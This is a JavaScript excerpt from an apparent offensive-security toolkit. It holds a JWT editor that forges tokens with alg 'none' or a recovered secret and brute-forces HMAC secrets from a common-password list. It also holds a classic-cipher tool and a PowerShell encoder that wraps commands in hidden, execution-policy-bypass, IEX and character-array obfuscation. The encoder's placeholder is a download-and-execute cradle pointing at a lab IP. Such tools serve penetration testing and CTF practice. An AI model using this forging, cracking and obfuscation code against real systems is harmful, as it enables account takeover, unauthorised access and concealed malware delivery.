    // ===== Decode flow (existing behavior) =====
    const doDecode = () => {
      const t = $('#jwt-input').value.trim();
      const parts = t.split('.');
      if (parts.length !== 3) {
        toast('Invalid JWT format');
        return null;
      }
      const decodeJson = (s) => {
        try { return JSON.stringify(JSON.parse(b64uDecode(s)), null, 2); }
        catch { return '(invalid base64)'; }
      };
      const out = $('#jwt-output');
      out.innerHTML = `
        <div class="jwt-section">
          <div class="jwt-label jwt-header">HEADER</div>
          <div class="result-box" style="color:#ef4444">${escapeHtml(decodeJson(parts[0]))}</div>
        </div>
        <div class="jwt-section">
          <div class="jwt-label jwt-payload">PAYLOAD</div>
          <div class="result-box" style="color:#a855f7">${escapeHtml(decodeJson(parts[1]))}</div>
        </div>
        <div class="jwt-section">
          <div class="jwt-label jwt-sig">SIGNATURE</div>
          <div class="result-box" style="color:#06b6d4">${escapeHtml(parts[2])}</div>
        </div>
      `;
      try {
        const payload = JSON.parse(b64uDecode(parts[1]));
        if (payload.exp || payload.iat) {
          const meta = el('div', { class: 'jwt-section' });
          let info = '';
          if (payload.iat) info += `<dt>Issued at</dt><dd>${new Date(payload.iat * 1000).toISOString()}</dd>`;
          if (payload.exp) {
            const expired = Date.now() > payload.exp * 1000 ? ' (EXPIRED)' : '';
            info += `<dt>Expires</dt><dd>${new Date(payload.exp * 1000).toISOString()}${expired}</dd>`;
          }
          meta.innerHTML = `<div class="jwt-label">CLAIMS</div><dl class="info-grid">${info}</dl>`;
          out.appendChild(meta);
        }
      } catch {}
      $('#jwt-results').style.display = 'block';

      // Auto-populate the editor so it's always visible after decoding
      try {
        $('#jwt-edit-header').value = JSON.stringify(JSON.parse(b64uDecode(parts[0])), null, 2);
        $('#jwt-edit-payload').value = JSON.stringify(JSON.parse(b64uDecode(parts[1])), null, 2);
        $('#jwt-editor').style.display = 'block';
        $('#jwt-edit-status').textContent = 'Edit the header or payload above, choose a signing strategy, then Rebuild Token.';
        $('#jwt-edit-status').style.color = 'var(--text-mute)';
        const h = JSON.parse($('#jwt-edit-header').value);
        if (['none', 'HS256', 'HS384', 'HS512'].includes(h.alg)) $('#jwt-sign-alg').value = h.alg;
      } catch (e) {
        toast('Could not parse JWT JSON for editor: ' + e.message);
      }

      return parts;
    };

    $('#jwt-decode').addEventListener('click', doDecode);

    // ===== Rebuild =====
    const setEditStatus = (msg, isErr) => {
      const el = $('#jwt-edit-status');
      el.textContent = msg;
      el.style.color = isErr ? 'var(--danger)' : 'var(--success)';
    };

    const rebuild = async () => {
      let header, payload;
      try { header = JSON.parse($('#jwt-edit-header').value); }
      catch (e) { return setEditStatus('Invalid header JSON: ' + e.message, true); }
      try { payload = JSON.parse($('#jwt-edit-payload').value); }
      catch (e) { return setEditStatus('Invalid payload JSON: ' + e.message, true); }

      const alg = $('#jwt-sign-alg').value;
      const secret = $('#jwt-secret').value;

      // Force the alg field in header to match the chosen signing strategy
      if (alg !== 'keep') header.alg = alg;

      const headerB64 = b64uEncode(JSON.stringify(header));
      const payloadB64 = b64uEncode(JSON.stringify(payload));
      const signingInput = `${headerB64}.${payloadB64}`;

      let sigB64 = '';
      try {
        if (alg === 'none') {
          sigB64 = '';
        } else if (alg === 'keep') {
          // Keep the original signature from the input token
          const orig = $('#jwt-input').value.trim().split('.')[2] || '';
          sigB64 = orig;
        } else if (alg in hashMap) {
          if (!secret) return setEditStatus('Secret required for HMAC signing', true);
          const sig = await hmacSign(signingInput, secret, hashMap[alg]);
          sigB64 = b64uEncodeBytes(sig);
        } else {
          return setEditStatus('Unsupported alg: ' + alg, true);
        }
      } catch (e) {
        return setEditStatus('Sign failed: ' + e.message, true);
      }

      const newToken = `${signingInput}.${sigB64}`;
      $('#jwt-output-token').value = newToken;
      setEditStatus(`Rebuilt with alg=${header.alg} (${newToken.length} chars)`);
    };

    $('#jwt-rebuild').addEventListener('click', rebuild);

    // ===== Try common secrets (HS256/384/512) =====
    const COMMON_SECRETS = [
      'secret', 'password', '123456', 'admin', 'jwt', 'jwtsecret', 'jwt_secret',
      'your-256-bit-secret', 'your-secret-key', 'mysecret', 'test', 'changeme',
      'supersecret', 'topsecret', 'qwerty', 'letmein', 'default', 'key', 'token',
      ''
    ];

    $('#jwt-crack').addEventListener('click', async () => {
      const t = $('#jwt-input').value.trim();
      const parts = t.split('.');
      if (parts.length !== 3) return setEditStatus('Decode a token first', true);
      let header;
      try { header = JSON.parse(b64uDecode(parts[0])); }
      catch { return setEditStatus('Invalid header in token', true); }
      const alg = header.alg;
      if (!(alg in hashMap)) return setEditStatus(`Token alg "${alg}" is not HMAC - cannot brute-force here`, true);

      const target = parts[2];
      const signingInput = `${parts[0]}.${parts[1]}`;
      setEditStatus(`Trying ${COMMON_SECRETS.length} common secrets against ${alg}...`);
      for (const s of COMMON_SECRETS) {
        try {
          const sig = await hmacSign(signingInput, s, hashMap[alg]);
          if (b64uEncodeBytes(sig) === target) {
            $('#jwt-secret').value = s;
            $('#jwt-sign-alg').value = alg;
            return setEditStatus(`CRACKED! secret = "${s || '(empty)'}" - filled into Secret field`);
          }
        } catch {}
      }
      setEditStatus('No match in the common secrets list. Try a real wordlist offline (jwt_tool, hashcat -m 16500).', true);
    });

    $('#jwt-copy-new').addEventListener('click', () => copy($('#jwt-output-token').value));
  }
};

// ===== CLASSIC CIPHERS =====
TOOLS['cipher'] = {
  title: 'Classic Ciphers',
  desc: 'Encrypt and decrypt classic ciphers including ROT13, Caesar, Atbash, and reverse.',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Input</div>
          <div class="field">
            <textarea id="cip-input" placeholder="enter text..."></textarea>
          </div>
          <div class="field">
            <label>Caesar shift (for Caesar cipher)</label>
            <input type="number" id="cip-shift" value="13">
          </div>
          <div class="btn-row">
            <button class="btn" data-cmd="rot13">ROT13</button>
            <button class="btn" data-cmd="caesar">Caesar</button>
            <button class="btn" data-cmd="atbash">Atbash</button>
            <button class="btn" data-cmd="reverse">Reverse</button>
          </div>
        </div>
        <div class="card" id="cip-results" style="display:none">
          <div class="result-header"><h4>Output</h4><button class="btn btn-ghost" id="cip-copy">Copy</button></div>
          <div class="result-box" id="cip-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const caesar = (s, n) => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - base + n + 26) % 26 + base);
    });
    const atbash = s => s.replace(/[a-z]/gi, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(25 - (c.charCodeAt(0) - base) + base);
    });
    $$('[data-cmd]', $('#cip-input').closest('.card')).forEach(b => {
      b.addEventListener('click', () => {
        const cmd = b.dataset.cmd;
        const txt = $('#cip-input').value;
        const n = parseInt($('#cip-shift').value) || 0;
        let r;
        if (cmd === 'rot13') r = caesar(txt, 13);
        else if (cmd === 'caesar') r = caesar(txt, n);
        else if (cmd === 'atbash') r = atbash(txt);
        else if (cmd === 'reverse') r = txt.split('').reverse().join('');
        $('#cip-output').textContent = r;
        $('#cip-results').style.display = 'block';
      });
    });
    $('#cip-copy').addEventListener('click', () => copy($('#cip-output').textContent));
  }
};


// ===== POWERSHELL ENCODER (-EncodedCommand, Base64 UTF-16LE) =====
TOOLS['ps-encode'] = {
  title: 'PowerShell Encoder',
  desc: 'Encode a PowerShell command into multiple execution and obfuscation variants.',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">PowerShell Command</div>
          <div class="field">
            <label>Command to encode</label>
            <textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>
          </div>
        </div>
        <div id="pe-out"></div>
      </div>`;
  },
  init() {
    const u16 = (s) => { let b = ''; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); b += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); } return btoa(b); };
    const u8 = (s) => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
    const VARIANTS = [
      ['EncodedCommand (Base64 UTF-16LE)', c => u16(c)],
      ['Full: powershell -EncodedCommand', c => 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ' + u16(c)],
      ['Base64 (UTF-8)', c => u8(c)],
      ['IEX FromBase64 (Unicode)', c => `powershell -nop -c "IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${u16(c)}')))"`],
      ['IEX FromBase64 (UTF-8)', c => `powershell -nop -c "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${u8(c)}')))"`],
      ['Char array (IEX)', c => 'powershell -nop -c "IEX(([char[]](' + [...c].map(ch => ch.charCodeAt(0)).join(',') + ') -join \'\'))"'],
      ['cmd /c (encoded)', c => 'cmd.exe /c powershell.exe -NoP -W Hidden -Enc ' + u16(c)],
    ];
    const out = $('#pe-out');
    let cur = 0;
    const render = () => {
      const cmd = $('#pe-in').value;
      if (!cmd) { out.innerHTML = ''; return; }
      out.innerHTML = `
        <div class="card">
          <div class="not-formats">${VARIANTS.map(([n], i) => `<button class="not-fmt" data-i="${i}">${escapeHtml(n)}</button>`).join('')}</div>
          <div class="result-header"><h4 class="not-fmt-title"></h4><button class="btn btn-ghost" id="pe-copy">Copy</button></div>
          <pre class="not-pre mono" id="pe-result"></pre>
        </div>`;
      const show = (i) => {
        cur = i;
        $('#pe-result', out).textContent = VARIANTS[i][1](cmd);
        $('.not-fmt-title', out).textContent = VARIANTS[i][0];
        $$('.not-fmt', out).forEach((b, j) => b.classList.toggle('active', j === i));
      };
      $$('.not-fmt', out).forEach(b => b.addEventListener('click', () => show(+b.dataset.i)));
      $('#pe-copy', out).addEventListener('click', () => copy($('#pe-result', out).textContent));
      show(Math.min(cur, VARIANTS.length - 1));
    };
    $('#pe-in').addEventListener('input', render);
    render();
  }
};
